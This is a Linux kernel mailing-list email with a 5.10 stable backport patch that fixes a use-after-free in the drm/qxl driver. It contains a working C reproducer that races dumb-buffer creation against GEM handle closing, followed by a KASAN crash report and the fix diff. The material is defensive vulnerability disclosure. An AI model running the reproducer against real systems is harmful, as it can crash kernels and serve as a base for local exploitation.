Return-Path: <linux-kernel+bounces-20743-lists+linux-kernel=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 1809F828483
	for <lists+linux-kernel@lfdr.de>; Tue,  9 Jan 2024 12:09:35 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 8C3A71F2569D
	for <lists+linux-kernel@lfdr.de>; Tue,  9 Jan 2024 11:09:34 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 4AFC43714E;
	Tue,  9 Jan 2024 11:09:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=ispras.ru header.i=@ispras.ru header.b="YjCaNyYc"
Received: from mail.ispras.ru (mail.ispras.ru [83.149.199.84])
	(using TLSv1.2 with cipher DHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5A67037145;
	Tue,  9 Jan 2024 11:09:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=ispras.ru
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=ispras.ru
Received: from localhost.ispras.ru (unknown [10.10.165.2])
	by mail.ispras.ru (Postfix) with ESMTPSA id 542FA40737CB;
	Tue,  9 Jan 2024 11:09:08 +0000 (UTC)
DKIM-Filter: OpenDKIM Filter v2.11.0 mail.ispras.ru 542FA40737CB
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ispras.ru;
	s=default; t=1704798548;
	bh=uQ1oVuq4q9cENt79RxFudKdoMMlOdSYzON+/bYTG5Io=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
	b=YjCaNyYc6eE5gHHV50pKcG1gA6XdmToaVbuG/7KfW8VzhsG0MARDQ/vzUIvZmV3rL
	 ceKngJijFkqs0VzwtNWGhPJ05hVt3Bsr1pcaGs07QXFPGJ2toR/2456HdoPAtWndBI
	 lOXwLwSZRKn8Xi5eDpa/C7X75692UnKs7BEJv37k=
From: Fedor Pchelkin <pchelkin@ispras.ru>
To: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	stable@vger.kernel.org
Cc: Fedor Pchelkin <pchelkin@ispras.ru>,
	Wander Lairson Costa <wander@redhat.com>,
	Dave Airlie <airlied@redhat.com>,
	Gerd Hoffmann <kraxel@redhat.com>,
	Daniel Vetter <daniel@ffwll.ch>,
	virtualization@lists.linux-foundation.org,
	spice-devel@lists.freedesktop.org,
	dri-devel@lists.freedesktop.org,
	linux-kernel@vger.kernel.org,
	Alexey Khoroshilov <khoroshilov@ispras.ru>,
	lvc-project@linuxtesting.org
Subject: [PATCH 5.10 1/1] drm/qxl: fix UAF on handle creation
Date: Tue,  9 Jan 2024 14:08:25 +0300
Message-ID: <20240109110827.9458-2-pchelkin@ispras.ru>
X-Mailer: git-send-email 2.43.0
In-Reply-To: <20240109110827.9458-1-pchelkin@ispras.ru>
References: <20240109110827.9458-1-pchelkin@ispras.ru>
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Wander Lairson Costa <wander@redhat.com>

commit c611589b4259ed63b9b77be6872b1ce07ec0ac16 upstream.

qxl_mode_dumb_create() dereferences the qobj returned by
qxl_gem_object_create_with_handle(), but the handle is the only one
holding a reference to it.

A potential attacker could guess the returned handle value and closes it
between the return of qxl_gem_object_create_with_handle() and the qobj
usage, triggering a use-after-free scenario.

Reproducer:

int dri_fd =-1;
struct drm_mode_create_dumb arg = {0};

void gem_close(int handle);

void* trigger(void* ptr)
{
	int ret;
	arg.width = arg.height = 0x20;
	arg.bpp = 32;
	ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &arg);
	if(ret)
	{
		perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
		exit(-1);
	}
	gem_close(arg.handle);
	while(1) {
		struct drm_mode_create_dumb args = {0};
		args.width = args.height = 0x20;
		args.bpp = 32;
		ret = ioctl(dri_fd, DRM_IOCTL_MODE_CREATE_DUMB, &args);
		if (ret) {
			perror("[*] DRM_IOCTL_MODE_CREATE_DUMB Failed");
			exit(-1);
		}

		printf("[*] DRM_IOCTL_MODE_CREATE_DUMB created, %d\n", args.handle);
		gem_close(args.handle);
	}
	return NULL;
}

void gem_close(int handle)
{
	struct drm_gem_close args;
	args.handle = handle;
	int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &args); // gem close handle
	if (!ret)
		printf("gem close handle %d\n", args.handle);
}

int main(void)
{
	dri_fd= open("/dev/dri/card0", O_RDWR);
	printf("fd:%d\n", dri_fd);

	if(dri_fd == -1)
		return -1;

	pthread_t tid1;

	if(pthread_create(&tid1,NULL,trigger,NULL)){
		perror("[*] thread_create tid1\n");
		return -1;
	}
	while (1)
	{
		gem_close(arg.handle);
	}
	return 0;
}

This is a KASAN report:

==================================================================
BUG: KASAN: slab-use-after-free in qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
Write of size 1 at addr ffff88801136c240 by task poc/515

CPU: 1 PID: 515 Comm: poc Not tainted 6.3.0 #3
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.0-debian-1.16.0-4 04/01/2014
Call Trace:
<TASK>
__dump_stack linux/lib/dump_stack.c:88
dump_stack_lvl+0x48/0x70 linux/lib/dump_stack.c:106
print_address_description linux/mm/kasan/report.c:319
print_report+0xd2/0x660 linux/mm/kasan/report.c:430
kasan_report+0xd2/0x110 linux/mm/kasan/report.c:536
__asan_report_store1_noabort+0x17/0x30 linux/mm/kasan/report_generic.c:383
qxl_mode_dumb_create+0x3c2/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:69
drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
vfs_ioctl linux/fs/ioctl.c:51
__do_sys_ioctl linux/fs/ioctl.c:870
__se_sys_ioctl linux/fs/ioctl.c:856
__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
do_syscall_x64 linux/arch/x86/entry/common.c:50
do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120
RIP: 0033:0x7ff5004ff5f7
Code: 00 00 00 48 8b 05 99 c8 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 69 c8 0d 00 f7 d8 64 89 01 48

RSP: 002b:00007ff500408ea8 EFLAGS: 00000286 ORIG_RAX: 0000000000000010
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff5004ff5f7
RDX: 00007ff500408ec0 RSI: 00000000c02064b2 RDI: 0000000000000003
RBP: 00007ff500408ef0 R08: 0000000000000000 R09: 000000000000002a
R10: 0000000000000000 R11: 0000000000000286 R12: 00007fff1c6cdafe
R13: 00007fff1c6cdaff R14: 00007ff500408fc0 R15: 0000000000802000
</TASK>

Allocated by task 515:
kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
kasan_save_alloc_info+0x1e/0x40 linux/mm/kasan/generic.c:510
____kasan_kmalloc linux/mm/kasan/common.c:374
__kasan_kmalloc+0xc3/0xd0 linux/mm/kasan/common.c:383
kasan_kmalloc linux/./include/linux/kasan.h:196
kmalloc_trace+0x48/0xc0 linux/mm/slab_common.c:1066
kmalloc linux/./include/linux/slab.h:580
kzalloc linux/./include/linux/slab.h:720
qxl_bo_create+0x11a/0x610 linux/drivers/gpu/drm/qxl/qxl_object.c:124
qxl_gem_object_create+0xd9/0x360 linux/drivers/gpu/drm/qxl/qxl_gem.c:58
qxl_gem_object_create_with_handle+0xa1/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:89
qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
vfs_ioctl linux/fs/ioctl.c:51
__do_sys_ioctl linux/fs/ioctl.c:870
__se_sys_ioctl linux/fs/ioctl.c:856
__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
do_syscall_x64 linux/arch/x86/entry/common.c:50
do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120

Freed by task 515:
kasan_save_stack+0x38/0x70 linux/mm/kasan/common.c:45
kasan_set_track+0x25/0x40 linux/mm/kasan/common.c:52
kasan_save_free_info+0x2e/0x60 linux/mm/kasan/generic.c:521
____kasan_slab_free linux/mm/kasan/common.c:236
____kasan_slab_free+0x180/0x1f0 linux/mm/kasan/common.c:200
__kasan_slab_free+0x12/0x30 linux/mm/kasan/common.c:244
kasan_slab_free linux/./include/linux/kasan.h:162
slab_free_hook linux/mm/slub.c:1781
slab_free_freelist_hook+0xd2/0x1a0 linux/mm/slub.c:1807
slab_free linux/mm/slub.c:3787
__kmem_cache_free+0x196/0x2d0 linux/mm/slub.c:3800
kfree+0x78/0x120 linux/mm/slab_common.c:1019
qxl_ttm_bo_destroy+0x140/0x1a0 linux/drivers/gpu/drm/qxl/qxl_object.c:49
ttm_bo_release+0x678/0xa30 linux/drivers/gpu/drm/ttm/ttm_bo.c:381
kref_put linux/./include/linux/kref.h:65
ttm_bo_put+0x50/0x80 linux/drivers/gpu/drm/ttm/ttm_bo.c:393
qxl_gem_object_free+0x3e/0x60 linux/drivers/gpu/drm/qxl/qxl_gem.c:42
drm_gem_object_free+0x5c/0x90 linux/drivers/gpu/drm/drm_gem.c:974
kref_put linux/./include/linux/kref.h:65
__drm_gem_object_put linux/./include/drm/drm_gem.h:431
drm_gem_object_put linux/./include/drm/drm_gem.h:444
qxl_gem_object_create_with_handle+0x151/0x180 linux/drivers/gpu/drm/qxl/qxl_gem.c:100
qxl_mode_dumb_create+0x1cd/0x400 linux/drivers/gpu/drm/qxl/qxl_dumb.c:63
drm_mode_create_dumb linux/drivers/gpu/drm/drm_dumb_buffers.c:96
drm_mode_create_dumb_ioctl+0x1f5/0x2d0 linux/drivers/gpu/drm/drm_dumb_buffers.c:102
drm_ioctl_kernel+0x21d/0x430 linux/drivers/gpu/drm/drm_ioctl.c:788
drm_ioctl+0x56f/0xcc0 linux/drivers/gpu/drm/drm_ioctl.c:891
vfs_ioctl linux/fs/ioctl.c:51
__do_sys_ioctl linux/fs/ioctl.c:870
__se_sys_ioctl linux/fs/ioctl.c:856
__x64_sys_ioctl+0x13d/0x1c0 linux/fs/ioctl.c:856
do_syscall_x64 linux/arch/x86/entry/common.c:50
do_syscall_64+0x5b/0x90 linux/arch/x86/entry/common.c:80
entry_SYSCALL_64_after_hwframe+0x72/0xdc linux/arch/x86/entry/entry_64.S:120

The buggy address belongs to the object at ffff88801136c000
which belongs to the cache kmalloc-1k of size 1024
The buggy address is located 576 bytes inside of
freed 1024-byte region [ffff88801136c000, ffff88801136c400)

The buggy address belongs to the physical page:
page:0000000089fc329b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11368
head:0000000089fc329b order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
raw: 000fffffc0010200 ffff888007841dc0 dead000000000122 0000000000000000
raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
ffff88801136c100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
ffff88801136c180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
>ffff88801136c200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
^
ffff88801136c280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
ffff88801136c300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================
Disabling lock debugging due to kernel taint

Instead of returning a weak reference to the qxl_bo object, return the
created drm_gem_object and let the caller decrement the reference count
when it no longer needs it. As a convenience, if the caller is not
interested in the gobj object, it can pass NULL to the parameter and the
reference counting is descremented internally.

The bug and the reproducer were originally found by the Zero Day Initiative project (ZDI-CAN-20940).

Link: https://www.zerodayinitiative.com/
Signed-off-by: Wander Lairson Costa <wander@redhat.com>
Cc: stable@vger.kernel.org
Reviewed-by: Dave Airlie <airlied@redhat.com>
Signed-off-by: Dave Airlie <airlied@redhat.com>
Link: https://patchwork.freedesktop.org/patch/msgid/20230814165119.90847-1-wander@redhat.com
[pchelkin: The problem can be reproduced on 5.10 stable. It lacks commit
f4a84e165e6d ("drm/qxl: allocate dumb buffers in ram"). Adjust a small
conflict regarding that commit: it affects only where the buffers are
placed.]
Signed-off-by: Fedor Pchelkin <pchelkin@ispras.ru>
---
 drivers/gpu/drm/qxl/qxl_drv.h   |  2 +-
 drivers/gpu/drm/qxl/qxl_dumb.c  |  5 ++++-
 drivers/gpu/drm/qxl/qxl_gem.c   | 25 +++++++++++++++++--------
 drivers/gpu/drm/qxl/qxl_ioctl.c |  6 ++----
 4 files changed, 24 insertions(+), 14 deletions(-)

diff --git a/drivers/gpu/drm/qxl/qxl_drv.h b/drivers/gpu/drm/qxl/qxl_drv.h
index aae90a9ee1db..ee59ef2cba77 100644
--- a/drivers/gpu/drm/qxl/qxl_drv.h
+++ b/drivers/gpu/drm/qxl/qxl_drv.h
@@ -329,7 +329,7 @@ int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
 				      u32 domain,
 				      size_t size,
 				      struct qxl_surface *surf,
-				      struct qxl_bo **qobj,
+				      struct drm_gem_object **gobj,
 				      uint32_t *handle);
 void qxl_gem_object_free(struct drm_gem_object *gobj);
 int qxl_gem_object_open(struct drm_gem_object *obj, struct drm_file *file_priv);
diff --git a/drivers/gpu/drm/qxl/qxl_dumb.c b/drivers/gpu/drm/qxl/qxl_dumb.c
index e377bdbff90d..f7bafc791b1e 100644
--- a/drivers/gpu/drm/qxl/qxl_dumb.c
+++ b/drivers/gpu/drm/qxl/qxl_dumb.c
@@ -34,6 +34,7 @@ int qxl_mode_dumb_create(struct drm_file *file_priv,
 {
 	struct qxl_device *qdev = to_qxl(dev);
 	struct qxl_bo *qobj;
+	struct drm_gem_object *gobj;
 	uint32_t handle;
 	int r;
 	struct qxl_surface surf;
@@ -62,11 +63,13 @@ int qxl_mode_dumb_create(struct drm_file *file_priv,
 
 	r = qxl_gem_object_create_with_handle(qdev, file_priv,
 					      QXL_GEM_DOMAIN_SURFACE,
-					      args->size, &surf, &qobj,
+					      args->size, &surf, &gobj,
 					      &handle);
 	if (r)
 		return r;
+	qobj = gem_to_qxl_bo(gobj);
 	qobj->is_dumb = true;
+	drm_gem_object_put(gobj);
 	args->pitch = pitch;
 	args->handle = handle;
 	return 0;
diff --git a/drivers/gpu/drm/qxl/qxl_gem.c b/drivers/gpu/drm/qxl/qxl_gem.c
index a08da0bd9098..fc5e3763c359 100644
--- a/drivers/gpu/drm/qxl/qxl_gem.c
+++ b/drivers/gpu/drm/qxl/qxl_gem.c
@@ -72,32 +72,41 @@ int qxl_gem_object_create(struct qxl_device *qdev, int size,
 	return 0;
 }
 
+/*
+ * If the caller passed a valid gobj pointer, it is responsible to call
+ * drm_gem_object_put() when it no longer needs to acess the object.
+ *
+ * If gobj is NULL, it is handled internally.
+ */
 int qxl_gem_object_create_with_handle(struct qxl_device *qdev,
 				      struct drm_file *file_priv,
 				      u32 domain,
 				      size_t size,
 				      struct qxl_surface *surf,
-				      struct qxl_bo **qobj,
+				      struct drm_gem_object **gobj,
 				      uint32_t *handle)
 {
-	struct drm_gem_object *gobj;
 	int r;
+	struct drm_gem_object *local_gobj;
 
-	BUG_ON(!qobj);
 	BUG_ON(!handle);
 
 	r = qxl_gem_object_create(qdev, size, 0,
 				  domain,
 				  false, false, surf,
-				  &gobj);
+				  &local_gobj);
 	if (r)
 		return -ENOMEM;
-	r = drm_gem_handle_create(file_priv, gobj, handle);
+	r = drm_gem_handle_create(file_priv, local_gobj, handle);
 	if (r)
 		return r;
-	/* drop reference from allocate - handle holds it now */
-	*qobj = gem_to_qxl_bo(gobj);
-	drm_gem_object_put(gobj);
+
+	if (gobj)
+		*gobj = local_gobj;
+	else
+		/* drop reference from allocate - handle holds it now */
+		drm_gem_object_put(local_gobj);
+
 	return 0;
 }
 
diff --git a/drivers/gpu/drm/qxl/qxl_ioctl.c b/drivers/gpu/drm/qxl/qxl_ioctl.c
index 5cea6eea72ab..9a02c4871400 100644
--- a/drivers/gpu/drm/qxl/qxl_ioctl.c
+++ b/drivers/gpu/drm/qxl/qxl_ioctl.c
@@ -39,7 +39,6 @@ static int qxl_alloc_ioctl(struct drm_device *dev, void *data,
 	struct qxl_device *qdev = to_qxl(dev);
 	struct drm_qxl_alloc *qxl_alloc = data;
 	int ret;
-	struct qxl_bo *qobj;
 	uint32_t handle;
 	u32 domain = QXL_GEM_DOMAIN_VRAM;
 
@@ -51,7 +50,7 @@ static int qxl_alloc_ioctl(struct drm_device *dev, void *data,
 						domain,
 						qxl_alloc->size,
 						NULL,
-						&qobj, &handle);
+						NULL, &handle);
 	if (ret) {
 		DRM_ERROR("%s: failed to create gem ret=%d\n",
 			  __func__, ret);
@@ -393,7 +392,6 @@ static int qxl_alloc_surf_ioctl(struct drm_device *dev, void *data,
 {
 	struct qxl_device *qdev = to_qxl(dev);
 	struct drm_qxl_alloc_surf *param = data;
-	struct qxl_bo *qobj;
 	int handle;
 	int ret;
 	int size, actual_stride;
@@ -413,7 +411,7 @@ static int qxl_alloc_surf_ioctl(struct drm_device *dev, void *data,
 						QXL_GEM_DOMAIN_SURFACE,
 						size,
 						&surf,
-						&qobj, &handle);
+						NULL, &handle);
 	if (ret) {
 		DRM_ERROR("%s: failed to create gem ret=%d\n",
 			  __func__, ret);
-- 
2.43.0


